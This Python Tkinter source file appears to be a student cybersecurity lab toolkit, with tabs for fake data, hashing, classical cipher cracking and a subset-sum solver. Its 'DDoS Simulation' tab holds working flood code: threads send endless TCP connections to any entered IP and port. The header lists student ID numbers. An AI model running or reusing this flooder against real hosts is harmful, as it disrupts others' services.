#Natan Ouaki - 341070217
#Omer Dahan - 208911958
#Ravin Asi - 208686162
#Tamir Mareli - 206862146


from tkinter import *
from tkinter import ttk, messagebox
from tkinter.scrolledtext import ScrolledText
from faker import Faker
import requests
import hashlib
from cryptography.fernet import Fernet
import threading
import socket
from itertools import combinations

faker = Faker()

class CyberApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberSecurity Lab Toolkit")
        self.root.geometry("900x700")
        self.root.config(bg="#1e1e2f")

        title = Label(root, text="CyberSecurity Toolkit", font=("Helvetica", 28, "bold"),fg="white", bg="#1e1e2f")
        title.pack(pady=15)

        names = Label(root, text="Natan Ouaki - Omer Dahan - Ravin Asi - Tamir Mareli", font=("Helvetica", 16, "bold"),fg="white", bg="#1e1e2f")
        names.pack(pady=5)

        self.tab_control = ttk.Notebook(root)
        self.tab_control.pack(expand=1, fill="both")

        self.create_faker_tab()
        self.create_requests_tab()
        self.create_hash_tab()
        self.create_caesar_tab()
        self.create_vigenere_tab()
        self.create_mssp_tab()
        self.create_ddos_tab()

    def create_faker_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='Faker Data')

        label = Label(tab, text="Choose Language", font=("Arial", 14), bg="#2b2b3d", fg="white")
        label.pack(pady=10)

        self.lang_combo = ttk.Combobox(tab, values=["en_US", "it_IT", "he_IL", "ja_JP"])
        self.lang_combo.current(0)
        self.lang_combo.pack(pady=5)

        btn = Button(tab, text="Generate Fake Data", command=self.generate_fake_data, bg="navyblue", fg="navyblue")
        btn.pack(pady=1)

        self.fake_output = ScrolledText(tab, height=10, width=80)
        self.fake_output.pack(pady=10)

    def create_requests_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='Request Keyword Search')

        url_label = Label(tab, text="Website URL:", bg="#2b2b3d", fg="white")
        url_label.pack(pady=5)
        self.url_entry = Entry(tab, width=60)
        self.url_entry.pack()

        keyword_label = Label(tab, text="Keyword to Search:", bg="#2b2b3d", fg="white")
        keyword_label.pack(pady=5)
        self.keyword_entry = Entry(tab, width=60)
        self.keyword_entry.pack()

        btn = Button(tab, text="Search Keyword", command=self.search_keyword, bg="#00cec9", fg="navyblue")
        btn.pack(pady=10)

        self.request_output = ScrolledText(tab, height=10, width=80)
        self.request_output.pack(pady=10)

    def create_hash_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='Hash/Encrypt')

        label = Label(tab, text="Enter Text to Encrypt/Hash:", bg="#2b2b3d", fg="white")
        label.pack(pady=5)
        self.hash_entry = Entry(tab, width=60)
        self.hash_entry.pack()

        self.hash_method = StringVar(value="SHA-256")
        sha_radio = Radiobutton(tab, text="SHA-256", variable=self.hash_method, value="SHA-256", bg="#2b2b3d", fg="white")
        sha_radio.pack()
        fernet_radio = Radiobutton(tab, text="Fernet", variable=self.hash_method, value="Fernet", bg="#2b2b3d", fg="white")
        fernet_radio.pack()

        btn = Button(tab, text="Encrypt", command=self.encrypt_text, bg="#6c5ce7", fg="navyblue")
        btn.pack(pady=10)

        self.hash_output = ScrolledText(tab, height=10, width=80)
        self.hash_output.pack(pady=10)

    def create_caesar_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='Caesar Cipher Attack')

        label = Label(tab, text="Enter Encrypted Caesar Text:", bg="#2b2b3d", fg="white")
        label.pack(pady=5)
        self.caesar_entry = Entry(tab, width=60)
        self.caesar_entry.pack()

        btn = Button(tab, text="Brute Force Decrypt", command=self.caesar_attack, bg="#e17055", fg="navyblue")
        btn.pack(pady=10)

        self.caesar_output = ScrolledText(tab, height=10, width=80)
        self.caesar_output.pack(pady=10)

    def create_vigenere_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='Vigenère Cipher')

        label1 = Label(tab, text="Enter Encrypted Vigenère Text:", bg="#2b2b3d", fg="white")
        label1.pack(pady=5)
        self.vigenere_entry = Entry(tab, width=60)
        self.vigenere_entry.pack()

        label2 = Label(tab, text="Enter Key (letters only):", bg="#2b2b3d", fg="white")
        label2.pack(pady=5)
        self.vigenere_key_entry = Entry(tab, width=60)
        self.vigenere_key_entry.pack()

        btn = Button(tab, text="Decrypt Vigenère", command=self.vigenere_decrypt, bg="#fdcb6e", fg="navyblue")
        btn.pack(pady=10)

        self.vigenere_output = ScrolledText(tab, height=10, width=80)
        self.vigenere_output.pack(pady=10)

    def create_mssp_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='MSSP Decryption')

        label = Label(tab, text="Enter Ciphertext for MSSP Decryption:", bg="#2b2b3d", fg="white")
        label.pack(pady=5)
        self.mssp_entry = Entry(tab, width=80)
        self.mssp_entry.pack()

        label_m = Label(tab, text="Enter m (group size):", bg="#2b2b3d", fg="white")
        label_m.pack(pady=2)
        self.mssp_m = Entry(tab, width=10)
        self.mssp_m.pack()

        label_d = Label(tab, text="Enter d:", bg="#2b2b3d", fg="white")
        label_d.pack(pady=2)
        self.mssp_d = Entry(tab, width=10)
        self.mssp_d.pack()

        btn = Button(tab, text="Compute MSSP", command=self.mssp_decrypt, bg="#0984e3", fg="navyblue")
        btn.pack(pady=10)

        self.mssp_output = ScrolledText(tab, height=16, width=90)
        self.mssp_output.pack(pady=10)

    def create_ddos_tab(self):
        tab = Frame(self.tab_control, bg="#2b2b3d")
        self.tab_control.add(tab, text='DDoS Simulation')

        Label(tab, text="Target IP:", bg="#2b2b3d", fg="white").pack(pady=5)
        self.ddos_ip = Entry(tab, width=40)
        self.ddos_ip.pack()

        Label(tab, text="Target Port:", bg="#2b2b3d", fg="white").pack(pady=5)
        self.ddos_port = Entry(tab, width=40)
        self.ddos_port.pack()

        Label(tab, text="Message to Send:", bg="#2b2b3d", fg="white").pack(pady=5)
        self.ddos_message = Entry(tab, width=40)
        self.ddos_message.pack()

        Label(tab, text="Number of Threads:", bg="#2b2b3d", fg="white").pack(pady=5)
        self.ddos_threads = Entry(tab, width=40)
        self.ddos_threads.pack()

        btn = Button(tab, text="Start DDoS", command=self.start_ddos, bg="#d63031", fg="navyblue")
        btn.pack(pady=10)

    def generate_fake_data(self):
        lang = self.lang_combo.get()
        local_faker = Faker(lang)
        result = "\n".join([
            f"Name: {local_faker.name()}",
            f"Address: {local_faker.address()}",
            f"Email: {local_faker.email()}",
            f"Phone: {local_faker.phone_number()}"
        ])
        self.fake_output.delete('1.0', END)
        self.fake_output.insert(END, result)

    def search_keyword(self):
        url = self.url_entry.get()
        keyword = self.keyword_entry.get()
        try:
            r = requests.get(url)
            lines = r.text.splitlines()
            result = []
            for i, line in enumerate(lines):
                if keyword.lower() in line.lower():
                    result.append(f"Line {i+1}: {line.strip()}")
            self.request_output.delete('1.0', END)
            self.request_output.insert(END, "\n".join(result) if result else "Keyword not found.")
        except Exception as e:
            self.request_output.delete('1.0', END)
            self.request_output.insert(END, f"Error: {e}")

    def encrypt_text(self):
        text = self.hash_entry.get()
        method = self.hash_method.get()
        if method == "SHA-256":
            hashed = hashlib.sha256(text.encode()).hexdigest()
            self.hash_output.delete('1.0', END)
            self.hash_output.insert(END, f"SHA-256: {hashed}")
        else:
            key = Fernet.generate_key()
            fernet = Fernet(key)
            token = fernet.encrypt(text.encode())
            self.hash_output.delete('1.0', END)
            self.hash_output.insert(END, f"Key: {key.decode()}\nEncrypted: {token.decode()}")

    def caesar_attack(self):
        cipher = self.caesar_entry.get()
        results = []
        for shift in range(26):
            decrypted = ''.join(
                chr((ord(char) - 65 - shift) % 26 + 65) if char.isupper() else
                chr((ord(char) - 97 - shift) % 26 + 97) if char.islower() else char
                for char in cipher
            )
            results.append(f"Shift {shift}: {decrypted}")
        self.caesar_output.delete('1.0', END)
        self.caesar_output.insert(END, "\n".join(results))

    def vigenere_decrypt(self):
        import string
        cipher = self.vigenere_entry.get()
        key = self.vigenere_key_entry.get()
        if not key.isalpha():
            self.vigenere_output.delete('1.0', END)
            self.vigenere_output.insert(END, "Key must contain letters only.")
            return
        key = key.lower()
        decrypted = []
        key_length = len(key)
        jump_table = []
        key_index = 0  

        for char in cipher:
            if char.isalpha():
                base = 65 if char.isupper() else 97
                shift = ord(key[key_index % key_length]) - 97
                dec_char = chr((ord(char) - base - shift) % 26 + base)
                decrypted.append(dec_char)
                key_index += 1   
            else:
                decrypted.append(char)

        for letter in key:
            shift = ord(letter) - 97
            shifted_alphabet = string.ascii_lowercase[shift:] + string.ascii_lowercase[:shift]
            jump_table.append(f"{letter.upper()} -> {shifted_alphabet}")

        output = "Decrypted Text:\n" + "".join(decrypted) + "\n\nJump Table:\n" + "\n".join(jump_table)
        self.vigenere_output.delete('1.0', END)
        self.vigenere_output.insert(END, output)

    def mssp_decrypt(self):
        ciphertext = self.mssp_entry.get().strip().replace('\n', '').replace(' ', '')
        try:
            m = int(self.mssp_m.get())
            d = int(self.mssp_d.get())
        except ValueError:
            self.mssp_output.delete(1.0, 'end')
            self.mssp_output.insert('end', "Error: m and d must be integers.")
            return

        if len(ciphertext) % d != 0:
            self.mssp_output.delete(1.0, 'end')
            self.mssp_output.insert('end', f"Error: Ciphertext length must be a multiple of d (digits per number).")
            return

        nums = [int(ciphertext[i:i+d]) for i in range(0, len(ciphertext), d)]
        groups = [nums[i:i+m] for i in range(0, len(nums), m)]

        output_lines = []
        output_lines.append("Groups and their numbers:")
        for i, group in enumerate(groups):
            output_lines.append(f"Group {i+1}: {group}")
        output_lines.append("----")

        subset_sum_dicts = []
        for group in groups:
            sum_dict = {}
            n = len(group)
            for k in range(1, n+1):
                for combo in combinations(group, k):
                    s = sum(combo)
                    sum_dict.setdefault(s, []).append(combo)
            subset_sum_dicts.append(sum_dict)

        all_sums = [set(d.keys()) for d in subset_sum_dicts]
        common_sums = set.intersection(*all_sums)
        if not common_sums:
            self.mssp_output.delete(1.0, 'end')
            self.mssp_output.insert('end', "\n".join(output_lines) + "\nNo common sum found across all groups.")
            return

        target_sum = list(sorted(common_sums))[0]
        output_lines.append(f"First target sum (appears in all groups): {target_sum}\n")

        for idx, group in enumerate(groups):
            sum_dict = subset_sum_dicts[idx]
            combs = sum_dict[target_sum]
            output_lines.append(f"Group {idx+1}: {group}")
            output_lines.append(f"Combinations that sum to {target_sum}:")
            for c in combs:
                output_lines.append(" + ".join(str(num) for num in c) + f" = {target_sum}")
            output_lines.append("----")

        output = "\n".join(output_lines)
        self.mssp_output.delete(1.0, 'end')
        self.mssp_output.insert('end', output)

    def ddos_attack(self, ip, port, msg):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.sendall(msg.encode())
                s.close()
            except:
                pass

    def start_ddos(self):
        try:
            ip = self.ddos_ip.get()
            port = int(self.ddos_port.get())
            msg = self.ddos_message.get()
            num_threads = int(self.ddos_threads.get())
        except Exception as e:
            messagebox.showerror("Input Error", f"Invalid input: {e}")
            return
        for _ in range(num_threads):
            t = threading.Thread(target=self.ddos_attack, args=(ip, port, msg))
            t.daemon = True
            t.start()

if __name__ == "__main__":
    root = Tk()
    app = CyberApp(root)
    root.mainloop()
